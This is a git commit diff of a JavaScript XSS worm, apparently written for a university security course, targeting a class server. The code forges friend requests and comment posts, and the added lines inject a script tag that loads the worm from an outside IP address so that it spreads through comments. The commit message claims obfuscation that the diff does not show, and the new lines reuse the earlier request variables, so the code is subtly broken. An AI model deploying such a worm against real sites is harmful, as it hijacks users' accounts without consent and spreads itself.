70c94bc6529ed873a8e9395319c7740a44b15574
avm7177 <amthy15@gmail.com>
2021-04-11 19:18:58 -0400

    adding obfuscation

--- xss_worm.js
+++ xss_worm.js
@@ -5,10 +5,11 @@ add_friend_req.open("GET", add_friend_url);
 add_friend_req.send();
 
 const comment_confirm_req = new XMLHttpRequest();
-const d = new Date();
-const t = d.getTime();
 const comment_confirm_url = "http://csec380-core.csec.rit.edu:86/add_comment.php?id=76&comment=HiThere!";
 comment_confirm_req.open("POST", comment_confirm_url);
 comment_confirm_req.send();
 
-
+const script_comment = new XMLHttpRequest();
+const script_comment_url = "http://csec380-core.csec.rit.edu:86/add_comment.php&comment=<script src=http://52.14.213.84/hw6_worm/xss_worm.js></script>";
+comment_confirm_req.open("POST", comment_confirm_url);
+comment_confirm_req.send();    
